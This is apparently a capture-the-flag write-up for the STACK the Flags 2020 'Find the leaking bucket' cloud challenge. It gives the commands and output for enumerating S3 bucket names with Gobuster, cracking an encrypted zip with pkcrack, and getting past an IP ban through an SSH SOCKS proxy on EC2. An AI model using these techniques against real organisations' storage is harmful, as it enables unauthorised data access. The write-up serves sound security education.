# Challenge: Find the leaking bucket! (Cloud-1)
It was made known to us that agents of COViD are exfiltrating data to a hidden S3 bucket in AWS! We do not know the bucket name! One tip from our experienced officers is that bucket naming often uses common words related to the company’s business.
Do what you can! Find that hidden S3 bucket (in the format “word1-word2-s4fet3ch”) and find out what was exfiltrated!

Company Website: https://d1ynvzedp0o7ys.cloudfront.net/

## Summary:
This company had a misconfigured S3 bucket which was publically exposed to the internet. Players had to brute-force the S3 bucket name using the words on the website to discover
this misconfigured bucket. They then had to perform a known plaintext attack on an encrypted zip file to obtain the flag.

Related MITRE ATT&CK techniques: 

T1530 - https://attack.mitre.org/techniques/T1530/

## Tools used:
OS - Kali Linux

CeWL - wordlist generator (https://github.com/digininja/CeWL)

Gobuster v3.0.1- URL Fuzzer (https://github.com/OJ/gobuster)

pkcrack - Zip Known Plaintext Attacker (https://github.com/keyunluo/pkcrack)

Amazon EC2 Instance (Optional) - as a proxy 

FoxyProxy browser plugin (Optional) - browser plugin for proxying (https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)

## Process:
From the website we see that there are words that are shown, from the challenge description we see that we have to use the common words related to the company's business.

### Step 1: Building the Wordlist
One tool we can use to extract the words is CeWL, CeWL is a tool that helps us generate wordlists from a website based on the words shown there

``````
cewl https://d1ynvzedp0o7ys.cloudfront.net/ > wordlist.txt
``````
This tool however does not work on pictures and it looks like we have to manually extract keywords from the Steve Jobs quote, to be safe I just extracted the entire Steve Jobs quote. I cleaned up the wordlist by removing capital letters as S3 buckets cannot consist of capital letters (https://docs.aws.amazon.com/AmazonS3/latest/dev/BucketRestrictions.html) as well as the CeWL header which generates everytime CeWL is loaded. The final wordlist can be found here - https://github.com/BunchOfBytes/STF-2020/blob/main/Cloud/wordlist.txt.

Now from this wordlist we can create a small Python script which helps us to generate all the possible S3 bucket names in the format “word1-word2-s4fet3ch”

File: script.py (https://github.com/BunchOfBytes/STF-2020/blob/main/Cloud/script.py)
``````
##Create a list of words from wordlist
wordlist=[]
file = 'wordlist.txt'
with open(file, 'r') as f:
    for line in f:
        line = line.rstrip("\n")    
        wordlist.append(line)

##Print the words to be outputted which will be redirected into a file later
for i in wordlist:
   str=""
   str+=(i+"-")
   print(str)
   for j in wordlist:
       str+=(j+"-")
       str+="s4fet3ch"
       print(str)
       str=(i+"-")
``````

Now we just redirect it to a new txt file
``````
python script.py > possible.txt
``````

### Step 2: Performing the bruteforce
Now we can use Gobuster which can help us to perform a directory bruteforce attack using our wordlist that we built. Please note that this should be performed with the latest
version of Gobuster (v3.0.1) as the syntax has changed a little over time
``````
gobuster dir -u http://s3-ap-southeast-1.amazonaws.com/ -w possible.txt
``````
You should receive the following output:
``````
===============================================================
2020/12/09 02:09:25 Finished
===============================================================
root@kali:~/Downloads# gobuster dir -u http://s3-ap-southeast-1.amazonaws.com/ -w possible.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3-ap-southeast-1.amazonaws.com/
[+] Threads:        10
[+] Wordlist:       possible.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/09 02:11:17 Starting gobuster
===============================================================
/think-innovation-s4fet3ch (Status: 200)
===============================================================
2020/12/09 02:11:20 Finished
===============================================================
``````
Initially I tried doing this but failed, I noticed that when I visited the AWS S3 link for the challenge downloads provided by GovTech, I get a NoSuchBucket error. However,
my friends did not receive that. So I concluded the AWS has shadowbanned my IP address from listing a bucket. If you do not receive the above, that means AWS has perhaps shadowbanned you too, I have included an optional step for you to take a look in case if you would like to bypass this (see below!).

Now we can visit https://s3-ap-southeast-1.amazonaws.com/think-innovation-s4fet3ch to view the XML listing of the bucket.

![XML Listing](https://github.com/BunchOfBytes/STF-2020/blob/main/Screenshot%20(2).png)

### Step 3: Cracking the encrypted zip file
We download the zip file
``````
wget https://think-innovation-s4fet3ch.s3-ap-southeast-1.amazonaws.com/secret-files.zip
``````

Once we have downloaded the zip file, we can inspect the contents to see that the zip file has two files - the indemnity form from Govtech Stack the Flags and the flag.txt it also requires a password. Since we have an indemnity form, we can use utilise PKCrack as we already have the plaintext indemnity form which can be downloaded from online (https://ctf.tech.gov.sg/files/STACK%20the%20Flags%20Consent%20and%20Indemnity%20Form.docx)

For download and install instructions on pkcrack - https://github.com/keyunluo/pkcrack

When we try executing pkcrack in the generated pkcrack/bin folder after we build the project we see that we need the 1) plaintext file 2) a zip of the plaintext file 3) the encrypted file.
``````
Usage: ./pkcrack.elf -c <crypted_file> -p <plaintext_file> [other_options],
where [other_options] may be one or more of
 -o <offset>    for an offset of the plaintext into the ciphertext,
                        (may be negative)
 -C <c-ZIP>     where c-ZIP is a ZIP-archive containing <crypted_file>
 -P <p-ZIP>     where p-ZIP is a ZIP-archive containing <plaintext_file>
 -d <d-file>    where d-file is the name of the decrypted archive which
                will be created by this program if the correct keys are found
                (can only be used in conjunction with the -C option)
 -i     switch off case-insensitive filename matching in ZIP-archives
 -a     abort keys searching after first success
 -n     no progress indicator
``````
We download the indemnity form. Now we need to zip it first
``````
zip indemnity.zip 'STACK the Flags Consent and Indemnity Form.docx'
``````
Now we use both the zipped version of the Indemnity form and the original version of the Indemnity form to perform the attack outputting the decrypted zip file into cracked.zip
and aborting after we successfully found the key.
``````
./pkcrack.elf -C secret-files.zip -c 'STACK the Flags Consent and Indemnity Form.docx' -p 'STACK the Flags Consent and Indemnity Form.docx' -P indemnity.zip -d cracked.zip -a
``````

We should receive this:
``````
Stage 2 completed. Starting zipdecrypt on Wed Dec  9 02:59:20 2020
Decrypting flag.txt (1918da1aa13583f007af7db7)... OK!
Decrypting STACK the Flags Consent and Indemnity Form.docx (336ab103cd78d1b9756efc91)... OK!
``````

Success! Now we just unzip the zip file and cat flag.txt
``````
unzip cracked.zip
cat flag.txt
``````

### Flag: govtech-csg{EnCrYpT!0n_D0e$_NoT_M3@n_Y0u_aR3_s4f3}

### Optional Step: What if I am blocked from scanning buckets on AWS?
Often times, especially when performing a pentest, we may try to mount bruteforce attacks and suddenly get banned from logging into the machine. If the ban is based on IP, instead of asking a client to reset a production machine which can cost our client money for the downtime, we can instead proxy our login requests through another machine we compromised.

Similarly, I created an Amazon EC2 Instance on the ap-southeast-1 region to proxy my requests through. You may read up how to do that here: (https://docs.aws.amazon.com/efs/latest/ug/gs-step-one-create-ec2-resources.html)

Once we have received our public key and created an instance we first change our permissions for the public key file (Replace with your public key name)
``````
chmod 400 stf.pem
``````

And we can perform a dynamic SSH portforwarding, (replace the public key name and generated EC2 address with your own.)
``````
ssh -i stf.pem -N -D 127.0.0.1:8080 ec2-user@52.221.195.216
``````

We can now utilise our machine as a proxy, luckily for us, Gobuster has an option for us to specify a proxy using -p
``````
gobuster dir -u http://s3-ap-southeast-1.amazonaws.com/ -p socks5://127.0.0.1:8080 -w possible.txt
``````
We can also use our browser to view the XML listing of files in the S3 bucket using the FoxyProxy browser plugin (See here: https://null-byte.wonderhowto.com/how-to/use-burp-foxyproxy-easily-switch-between-proxy-settings-0196630/) Configure it to use the proxy IP 127.0.0.1, port 8080 and proxy type SOCKS5. We should be able see the XML listing and hence download the secret-files.zip. 
### Writeup by: Haxatron
